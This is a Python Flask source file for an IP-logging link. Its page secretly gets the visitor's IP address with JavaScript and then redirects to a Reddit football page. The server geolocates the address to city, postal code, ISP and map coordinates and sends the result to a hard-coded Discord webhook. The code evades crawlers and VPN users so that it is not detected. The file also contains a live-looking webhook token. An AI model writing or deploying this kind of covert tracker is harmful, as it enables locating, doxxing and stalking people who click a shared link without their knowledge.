# main.py
from flask import Flask, request, redirect, jsonify, abort
import requests
from datetime import datetime
import threading
import time

app = Flask(__name__)

# ========== CONFIG ==========
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"

# UA bot keywords
BOT_UA_KEYWORDS = [
    "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider",
    "yandexbot", "sogou", "exabot", "facebot", "facebookexternalhit",
    "ia_archiver", "python-requests", "go-http-client", "curl", "wget",
]

# datacenter/org keywords for simple VPN detection
CLOUD_ORG_KEYWORDS = [
    "amazon", "aws", "google", "google cloud", "microsoft", "azure",
    "digitalocean", "hetzner", "linode", "ovh", "oracle", "cloudflare"
]

# cooldown in seconds between webhooks from the same IP (set to 0 to allow immediate repeats)
COOLDOWN_SECONDS = 10

# store last sent timestamp per IP instead of a simple daily set
last_sent_by_ip = {}

# daily cleanup - optional: clear the dict once a day to avoid unbounded growth
def clear_last_sent():
    global last_sent_by_ip
    last_sent_by_ip = {}
    threading.Timer(86400, clear_last_sent).start()

clear_last_sent()

# ========= HELPERS ==========
def now_gmt():
    return datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")

def is_bot_user_agent(ua: str) -> bool:
    if not ua:
        return False
    ua_l = ua.lower()
    return any(k in ua_l for k in BOT_UA_KEYWORDS)

def simple_org_vpn_check(org: str) -> bool:
    if not org:
        return False
    org_l = org.lower()
    return any(k in org_l for k in CLOUD_ORG_KEYWORDS)

def fetch_ipapi(ip: str) -> dict:
    try:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; VisitorLogger/1.0)"}
        r = requests.get(f"https://ipapi.co/{ip}/json/", headers=headers, timeout=6)
        if r.status_code == 200:
            return r.json() or {}
    except Exception:
        pass
    return {}

def fetch_ipwho_is(ip: str) -> dict:
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=6)
        if r.status_code == 200:
            data = r.json() or {}
            if data.get("success", True):
                return data
    except Exception:
        pass
    return {}

def enrich_ip(ip: str) -> dict:
    details = fetch_ipapi(ip)
    source = "ipapi"
    # fallback if missing important fields
    if not details or (details.get("city") is None and details.get("org") is None and not details.get("latitude")):
        fallback = fetch_ipwho_is(ip)
        if fallback:
            details = {
                "city": fallback.get("city"),
                "region": fallback.get("region"),
                "country_name": fallback.get("country"),
                "postal": fallback.get("postal") or fallback.get("postal_code"),
                "org": fallback.get("org") or fallback.get("connection", {}).get("asn_org") or fallback.get("isp"),
                "latitude": fallback.get("latitude") or fallback.get("lat"),
                "longitude": fallback.get("longitude") or fallback.get("lon"),
                "raw_fallback": fallback
            }
            source = "ipwho.is"
    # normalize lat/lon
    try:
        lat = details.get("latitude") or details.get("lat") or 0
        lon = details.get("longitude") or details.get("lon") or 0
        details["latitude"] = float(lat) if lat not in (None, "", 0) else 0
        details["longitude"] = float(lon) if lon not in (None, "", 0) else 0
    except Exception:
        details["latitude"] = 0
        details["longitude"] = 0
    details.setdefault("city", None)
    details.setdefault("region", None)
    details.setdefault("country_name", None)
    details.setdefault("postal", None)
    details.setdefault("org", None)
    details.setdefault("security", {})
    details["_source"] = source
    return details

def detect_vpn_or_proxy(details: dict) -> bool:
    sec = details.get("security") or {}
    if isinstance(sec, dict):
        if sec.get("vpn") or sec.get("proxy") or sec.get("hosting"):
            return True
    raw = details.get("raw_fallback") or {}
    if isinstance(raw, dict):
        if raw.get("threat") or raw.get("type") in ("hosting", "vpn", "proxy"):
            return True
    org = details.get("org") or ""
    if simple_org_vpn_check(org):
        return True
    return False

def build_map_url(details: dict) -> str:
    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)
    if lat and lon:
        return f"https://www.google.com/maps?q={lat},{lon}"
    parts = [p for p in [details.get("city"), details.get("region"), details.get("country_name")] if p]
    if parts:
        q = "+".join("".join(str(x).split()) for x in parts)
        return f"https://www.google.com/maps/search/{q}"
    return "https://www.google.com/maps"

def send_discord_embed(info: dict) -> bool:
    color_red = 15158332
    map_url = info.get("map_url", "https://www.google.com/maps")
    embed = {
        "username": "🚨 Visitor Alert",
        "embeds": [{
            "title": f"🚨 New Visitor — {info.get('city') or 'Unknown'}",
            "description": f"**IP:** `{info.get('ip')}`",
            "color": color_red,
            "fields": [
                {"name": "Location", "value": f"{info.get('city') or 'Unknown'}, {info.get('region') or 'Unknown'} ({info.get('country') or 'Unknown'})", "inline": False},
                {"name": "Postal", "value": info.get('postal') or "Unknown", "inline": True},
                {"name": "ISP / Org", "value": info.get('org') or "Unknown ISP", "inline": True},
                {"name": "VPN/Proxy", "value": "Yes 🚨" if info.get('vpn') else "No ✅", "inline": True},
                {"name": "Map", "value": f"[Open Map]({map_url})", "inline": False},
                {"name": "User Agent", "value": f"`{info.get('user_agent') or 'Unknown'}`", "inline": False},
                {"name": "Source", "value": info.get("_source") or "ipapi", "inline": True},
                {"name": "Time (UTC)", "value": info.get("time") or now_gmt(), "inline": True}
            ]
        }]
    }
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=6)
        return 200 <= r.status_code < 300
    except Exception:
        return False

# ========== ROUTES ===========
@app.route('/')
def root():
    html = f"""
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting…</title></head>
      <body>
        <script>
          fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {{
              try {{
                fetch('/log', {{
                  method: 'POST',
                  headers: {{'Content-Type': 'application/json'}},
                  body: JSON.stringify({{ ip: d.ip, ua: navigator.userAgent }})
                }});
              }} catch(e){{}}
              window.location.replace('{REDIRECT_URL}');
            }})
            .catch(() => {{ window.location.replace('{REDIRECT_URL}'); }});
        </script>
        <p>Redirecting…</p>
      </body>
    </html>
    """
    return html

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "bad request"}), 400

    ip = data.get("ip")
    user_agent = data.get("ua") or request.headers.get("User-Agent", "Unknown")

    if not ip:
        return jsonify({"error": "no ip provided"}), 400

    # quick UA bot check -> 404
    if is_bot_user_agent(user_agent):
        abort(404)

    # cooldown check
    now_ts = time.time()
    last_ts = last_sent_by_ip.get(ip, 0)
    if COOLDOWN_SECONDS > 0 and (now_ts - last_ts) < COOLDOWN_SECONDS:
        # still in cooldown, do not send another webhook; respond OK
        return jsonify({"status": "cooldown"}), 200

    # enrich ip details
    details = enrich_ip(ip)

    # vpn/proxy/datacenter detection -> 404
    if detect_vpn_or_proxy(details):
        abort(404)

    info = {
        "ip": ip,
        "user_agent": user_agent,
        "city": details.get("city") or None,
        "region": details.get("region") or None,
        "country": details.get("country_name") or details.get("country") or None,
        "postal": details.get("postal") or None,
        "org": details.get("org") or None,
        "latitude": details.get("latitude") or 0,
        "longitude": details.get("longitude") or 0,
        "vpn": False,
        "_source": details.get("_source"),
        "time": now_gmt()
    }
    info["map_url"] = build_map_url(details)

    # mark last sent timestamp BEFORE sending to avoid duplicates on retries
    last_sent_by_ip[ip] = now_ts

    # send single embed
    send_discord_embed(info)

    return jsonify({"status": "ok"}), 200

# ========== RUN ===========
if __name__ == "__main__":
    # production: use gunicorn main:app
    app.run(host="0.0.0.0", port=10000, debug=False)
